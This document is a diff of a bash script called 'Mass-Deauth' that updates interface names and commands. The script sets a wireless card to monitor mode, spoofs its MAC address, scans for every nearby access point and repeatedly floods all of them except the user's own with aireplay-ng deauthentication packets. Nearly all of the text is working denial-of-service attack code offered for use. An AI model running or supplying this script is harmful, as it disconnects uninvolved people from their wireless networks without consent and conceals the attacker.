@@ -4,81 +4,71 @@
 # Copyright (c) GPLv3 - 2013 RFKiller
 # Please see the LICENSE file that came with this program
 
-
-
 ########################### USER VAIABLES
-waitTime="10" # Time to wait before refreshing attack
+waitTime="30" # Time to wait before refreshing attack
 MIFACE="mon0"  # monitor interface
-WIFACE="wlp2s0"  # wireless card's interface
+WIFACE="wlp3s0u1"  # wireless card's interface
 DEAUTHS="10" # number of deauths to send; 0 = Infinite
-ourAPmac="5C:57:1A:CD:0C:61"  # our own AP's MAC address; so we don't own our own AP
+ourAPmac="5c:57:1a:cd:0c:61"  # our own AP's MAC address; so we don't own our own AP
 
 ########################### LOGICAL STUFF - don't touch unless you're 31337
 version="0.1"
 atk="0"
 echo -e "\e[01;32m[>]\e[00m Setting up for attack..."
 
-trap cleanup INT # Interrupt - "Ctrl + C"
+trap cleanup INT
 function cleanup() {
 	xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Killing deauths..." -e "killall -9 aireplay-ng"
-	rm /tmp/{*.tmp,*.lst}
+	airmon-ng stop $MIFACE
+	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
+	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
+	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi	
 	exit 0
 }
+
+ip link set $WIFACE up
 
 if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
 if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
 if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
 
-moncheck=`ifconfig | grep $MIFACE | awk '{print $1}' | cut -b 4`
+# moncheck=`iw dev | grep $MIFACE | awk '{print $2}'`
 
-xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Start $WIFACE" -e "ifconfig $WIFACE up" &
+xterm -geometry 75x12+464+288 -T "Mass-Deauth v$version - Start $WIFACE" -e "ip link set $WIFACE up" &
 
-while [ ! $moncheck ];
-do
-	moncheck=`ifconfig | grep $MIFACE | awk '{print $1}' | cut -b 4`
-	xterm -geometry 75x10+464+446 -T "Mass-Deauth v$version - Start $MIFACE" -e "airmon-ng start $WIFACE"
-	moncheck=`ifconfig | grep $MIFACE | awk '{print $1}' | cut -b 4`
+while [ ! $moncheck ]; do
+	moncheck=`iw dev | grep $MIFACE | awk '{print $2}'`
+	xterm -geometry 75x10+464+446 -T "Mass-Deauth v$version - Start $MIFACE" -e "ip link set $WIFACE up && airmon-ng start $WIFACE"
+	moncheck=`iw dev | grep $MIFACE | awk '{print $2}'`
 done
 
 echo -e "\e[01;32m[>]\e[00m Changing MAC Address..."
-xterm -geometry 75x8+100+0 -T "Mass-Deauth v$version - Changing MAC Address of $MIFACE" -e "ifconfig $MIFACE down && macchanger -A $MIFACE && ifconfig $MIFACE up" &
-sleep 2
+xterm -geometry 75x8+100+0 -T "Mass-Deauth v$version - Changing MAC Address of $MIFACE" -e "ip link set $MIFACE down && macchanger -A $MIFACE && ip link set $MIFACE up" &
+sleep 3
 scan1="0"
 
-while true
-do
+while true; do
 	curLine="1"
 	x="1"
-
-	#SLEEPING SO WE DONT OWN TOO HARD
 	echo -e "\e[01;32m[>]\e[00m[!] Press [ CTRL+C ]  in this Window to Kill Attack..."
 	if [ $scan1 -ne 0 ]; then echo -e "\e[01;32m[>]\e[00m Sleeping for $waitTime seconds..." && sleep $waitTime; fi
-
-	#REMOVE OLD SCAN DATA
 	if [ -e "/tmp/scan.tmp" ]; then rm /tmp/scan.tmp ; fi
 	if [ -e "/tmp/APmacs.lst" ]; then rm /tmp/APmacs.lst ; fi
 	if [ -e "/tmp/APchannels.lst" ]; then rm /tmp/APchannels.lst ; fi
-
-	#CREATE NEW UPDATED SCAN DATA
 	iwlist $WIFACE scan > /tmp/scan.tmp
-	sleep 2
+	sleep 3
 	cat /tmp/scan.tmp | grep "Address:" | grep -v $ourAPmac | cut -b 30-60 > /tmp/APmacs.lst
 	cat /tmp/scan.tmp | grep "Channel:" | cut -b 29 > /tmp/APchannels.lst
-
-	#RESET VARIABLES
 	lineNum=`wc -l /tmp/APmacs.lst | awk '{ print $1}'`
 	curCHAN=`cat /tmp/APchannels.lst | head -n $curLine`
 	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
-
 	echo -e "\e[01;32m[>]\e[00m Deauth'ing $lineNum APs from scan data..."
-	#T3H 1337 ALGORITHM
-       for (( b=1; b<=$lineNum; b++ ))
-	do
-	scan1="1"
-	curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
-	echo -e "\e[01;32m[>]\e[00m Deauth'ing All Clients on $curAP ..."
-	xterm -geometry 75x9+464+446 -T "Mass-Deauth v$version" -e "aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE" &
-	curLine=$(($curLine+$x))
+	for (( b=1; b<=$lineNum; b++ )); do
+			scan1="1"
+			curAP=`sed -n -e ''$curLine'p' '/tmp/APmacs.lst'`
+			echo -e "\e[01;32m[>]\e[00m Deauth'ing All Clients on $curAP ..."
+			xterm -geometry 75x9+464+446 -T "Mass-Deauth v$version" -e "aireplay-ng -0 $DEAUTHS -D -a $curAP $MIFACE" &
+			curLine=$(($curLine+$x))
 	done
 	atk="1"
 done
